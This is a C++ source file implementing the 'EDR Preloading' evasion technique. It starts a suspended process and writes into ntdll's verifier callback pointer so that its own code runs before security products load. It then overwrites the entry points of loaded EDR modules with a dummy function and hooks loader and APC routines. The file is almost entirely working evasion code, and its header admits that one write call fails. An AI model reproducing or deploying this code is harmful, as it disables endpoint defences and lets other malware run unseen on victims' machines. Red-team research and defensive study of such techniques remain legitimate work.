/*
* Title: EDR Preloading
* Resources:
*	- https://github.com/MalwareTech/EDR-Preloader
* Status: I may have overlooked it, but the first WriteProcessMemory causes error code 0x3e6.
*/
#include <Windows.h>
#include <stdint.h>
#include <stdio.h>
#include "Nt.hpp"
#include "SafeRuntime.hpp"
#include "Hde64.hpp"
#include "EdrPreloading.hpp"

static PTR_TABLE g_ptrTable = { 0 };

_LdrLoadDll OriginalLdrLoadDll = nullptr;

extern "C" {
	// Defined in KiUserApc.asm
	void KiUserApcDispatcher();

	// Called from KiUserApcDipatcher() to get the NtContinue() address from g_ptrTable structure
	LPVOID GetNtContinue() {
		return g_ptrTable.NtContinue;
	}
}

VOID Cleanup(HANDLE hProcess, HANDLE hThread) {
	if (hProcess)
		CloseHandle(hProcess);
	if (hThread)
		CloseHandle(hThread);
}

PVOID GetSectionAddr(HMODULE hModule, PCHAR sectionName) {
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)pDosHeader + pDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER pSecHeader = IMAGE_FIRST_SECTION(pNtHeaders);

	for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
		if (memcmp(sectionName, pSecHeader[i].Name, strlen(sectionName)) == 0) {
			return (PVOID)((DWORD_PTR)pDosHeader + pSecHeader[i].VirtualAddress);
		}
	}

	return nullptr;
}

// Find the address of the AvrfpAPILookupCallbackRoutine function.
ULONG_PTR FindAvrfpAPILookupCallbackRoutine(ULONG_PTR mrdataBase) {
	ULONG_PTR addrPtr = mrdataBase + 0x280;
	ULONG_PTR ldrpMrdataBase = NULL;

	// LdrpMrdataBase contains the .mrdata section base address and is located directly before AvrfpAPILookupCallbackRoutine.
	for (int i = 0; i < 10; i++) {
		if (*(ULONG_PTR*)addrPtr == mrdataBase) {
			ldrpMrdataBase = addrPtr;
		}
		addrPtr += sizeof(LPVOID);
	}
	
	if (!ldrpMrdataBase)
		return NULL;

	addrPtr = ldrpMrdataBase;

	// AvrfpAPILookupCallbackRoutine should be the first NULL pointer after LdrpMrdataBase.
	for (int i = 0; i < 10; i++) {
		if (*(ULONG_PTR*)addrPtr == NULL) {
			return addrPtr;
		}
		addrPtr += sizeof(LPVOID);
	}

	return NULL;
}

// A benign function we can replace the EDR entrypoint pointer with
DWORD EdrParadise() {
	return ERROR_TOO_MANY_SECRETS;
}

void DisablePreloadedEdrModules() {
	PEB* peb = NtCurrentTeb()->ProcessEnvironmentBlock;

	LIST_ENTRY* listHead = &peb->Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* listEntry = listHead->Flink->Flink;

	while (listEntry != listHead) {
		PLDR_DATA_TABLE_ENTRY2 moduleEntry = CONTAINING_RECORD(listEntry, LDR_DATA_TABLE_ENTRY2, InMemoryOrderLinks);

		if (SafeRuntime::wstring_compare_i(moduleEntry->BaseDllName.Buffer, L"ntdll.dll") != 0 &&
			SafeRuntime::wstring_compare_i(moduleEntry->BaseDllName.Buffer, L"kernel32.dll") != 0 &&
			SafeRuntime::wstring_compare_i(moduleEntry->BaseDllName.Buffer, L"kernelbase.dll") != 0) {

			moduleEntry->EntryPoint = &EdrParadise;
		}

		listEntry = listEntry->Flink;
	}
}

NTSTATUS WINAPI LdrLoadDllHook(PWSTR search_path, PULONG dll_characteristics, UNICODE_STRING* dll_name, PVOID* base_address) {
	g_ptrTable.OutputDebugStringW(dll_name->Buffer);
	return OriginalLdrLoadDll(search_path, dll_characteristics, dll_name, base_address);
}

// A simple hooking function to enable us to hook ntdll function (don't use this in prod, the code is awful).
void HookFunction(LPVOID lpTargetAddr, LPVOID lpHookProcedure, LPVOID* lpOriginalBytes) {
	BYTE jmpBuffer[] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };
	BYTE retBuffer[32] = { 0x90 };
	size_t dwTotalSize = 0;
	size_t dwInstLen = 0;

	BYTE* ip = (BYTE*)lpTargetAddr;

	// Figure out how many instructions we're going to overwrite.
	while (dwTotalSize < sizeof(jmpBuffer)) {
		hde64s s;
		dwInstLen = hde64_disasm(&ip[dwTotalSize], &s);
		dwTotalSize += dwInstLen;
	}

	PVOID pExecBuffer = nullptr;

	if (lpOriginalBytes) {
		// Make the jump instruction to return to the original function.
		*(ULONG_PTR*)&jmpBuffer[2] = ((ULONG_PTR)lpTargetAddr + dwTotalSize);

		// Copy the bytes we'll overwrite into the ret buffer.
		SafeRuntime::memcpy(&retBuffer, lpTargetAddr, dwTotalSize);
		
		// Append the original bytes with a jmp to return to the original function.
		SafeRuntime::memcpy(&retBuffer[dwTotalSize], &jmpBuffer, sizeof(jmpBuffer));

		// Allocate some executable memory to copy the original bytes to
		g_ptrTable.NtAllocateVirtualMemory((HANDLE)-1, &pExecBuffer, 0, &dwTotalSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		*lpOriginalBytes = pExecBuffer;

		// Copy the original bytes.
		SafeRuntime::memcpy(*lpOriginalBytes, &retBuffer, sizeof(retBuffer));
	}

	PVOID pProtectAddr = lpTargetAddr;
	DWORD dwOldProtect = 0;

	// Set the target page memory to RWX so we can write our hooks to it.
	g_ptrTable.NtProtectVirtualMemory((HANDLE)-1, &pProtectAddr, &dwTotalSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// Make the jump instruction to redirect execution to our hook handler.
	*(ULONG_PTR*)&jmpBuffer[2] = ((ULONG_PTR)lpHookProcedure);

	// Hook the target function.
	SafeRuntime::memcpy(lpTargetAddr, &jmpBuffer, sizeof(jmpBuffer));

	// re-protect the executable memory.
	g_ptrTable.NtProtectVirtualMemory((HANDLE)-1, &pProtectAddr, &dwTotalSize, dwOldProtect, &dwOldProtect);
}

LPVOID WINAPI LdrGetProcedureAddressCallback(LPVOID lpDllBase, LPVOID lpCaller, LPVOID lpFuncAddr) {
	static BOOL bHookPlaced = FALSE;

	if (!bHookPlaced) {
		bHookPlaced = TRUE;

		DisablePreloadedEdrModules();
		HookFunction(g_ptrTable.LdrLoadDll, LdrLoadDllHook, (LPVOID*)&OriginalLdrLoadDll);
		HookFunction(g_ptrTable.KiUserApcDispatcher, KiUserApcDispatcher, nullptr);
	}

	return lpFuncAddr;
}

// Ref: https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html
LPVOID EncodeSystemPtr(PVOID ptr) {
	DWORD dwSharedUserCookie = *(DWORD*)0x7FFE0330;
	return (LPVOID)(_rotr64(dwSharedUserCookie ^ (DWORD_PTR)ptr, dwSharedUserCookie & 0x3F));
}

BOOL EdrPreloading() {
	char lpProcess[] = "C:\\Windows\\System32\\notepad.exe"; // Change it.

	// ----------------------------------------------------------------------------- //
	// Preparation.
	// ----------------------------------------------------------------------------- //

	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
	if (!hNtdll || !hKernel32) return FALSE;

	// Find the address of the AvrfpAPILookupCallbackRoutine function.
	PVOID pMrdataSection = GetSectionAddr(hNtdll, (PCHAR)".mrdata");
	if (!pMrdataSection) return FALSE;
	ULONG_PTR avrfpAddr = FindAvrfpAPILookupCallbackRoutine((ULONG_PTR)pMrdataSection);
	if (!avrfpAddr) return FALSE;

	// We can't call GetProcAddress() in the child process due to kernel32 not being loaded, so we'll resolve ahead of time
	g_ptrTable.NtProtectVirtualMemory = reinterpret_cast<_NtProtectVirtualMemory>(GetProcAddress(hNtdll, "NtProtectVirtualMemory"));
	if (!g_ptrTable.NtProtectVirtualMemory) return FALSE;
	g_ptrTable.NtAllocateVirtualMemory = reinterpret_cast<_NtAllocateVirtualMemory>(GetProcAddress(hNtdll, "NtAllocateVirtualMemory"));
	if (!g_ptrTable.NtAllocateVirtualMemory) return FALSE;
	g_ptrTable.LdrLoadDll = reinterpret_cast<_LdrLoadDll>(GetProcAddress(hNtdll, "LdrLoadDll"));
	if (!g_ptrTable.LdrLoadDll) return FALSE;
	g_ptrTable.NtContinue = reinterpret_cast<_NtContinue>(GetProcAddress(hNtdll, "NtContinue"));
	if (!g_ptrTable.NtContinue) return FALSE;
	g_ptrTable.KiUserApcDispatcher = reinterpret_cast<_NtContinue>(GetProcAddress(hNtdll, "KiUserApcDispatcher"));
	if (!g_ptrTable.KiUserApcDispatcher) return FALSE;
	g_ptrTable.OutputDebugStringW = reinterpret_cast<_OutputDebugStringW>(GetProcAddress(hKernel32, "OutputDebugStringW"));
	if (!g_ptrTable.OutputDebugStringW) return FALSE;

	// ----------------------------------------------------------------------------- //
	// Create new process and .
	// ----------------------------------------------------------------------------- //

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);

	if (!CreateProcessA(nullptr, lpProcess, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
		Cleanup(pi.hProcess, pi.hThread);
		return FALSE;
	}

	// ----------------------------------------------------------------------------- //
	// Write to the process.
	// ----------------------------------------------------------------------------- //

	// Overwrite the g_ptrTable in the child proecess with the already initialized one.
	if (!WriteProcessMemory(pi.hProcess, &g_ptrTable, &g_ptrTable, sizeof(PTR_TABLE), nullptr)) {
		Cleanup(pi.hProcess, pi.hThread);
		return FALSE;
	}

	LPVOID lpCallbackPtr = EncodeSystemPtr(&LdrGetProcedureAddressCallback);

	// Set ntdll!AvrfpAPILookupCallbackRoutine to our encoded callback address.
	if (!WriteProcessMemory(pi.hProcess, (LPVOID)(avrfpAddr + 8), &lpCallbackPtr, sizeof(ULONG_PTR), NULL)) {
		Cleanup(pi.hProcess, pi.hThread);
		return FALSE;
	}

	// Set ntdll!AvrfpAPILookupCallbacksEnabled to TRUE
	uint8_t boolTrue = 1;

	if (!WriteProcessMemory(pi.hProcess, (LPVOID)avrfpAddr, &boolTrue, 1, NULL)) {
		Cleanup(pi.hProcess, pi.hThread);
		return FALSE;
	}

	// ----------------------------------------------------------------------------- //
	// Resume and execute.
	// ----------------------------------------------------------------------------- //

	Cleanup(pi.hProcess, pi.hThread);

	return TRUE;
}
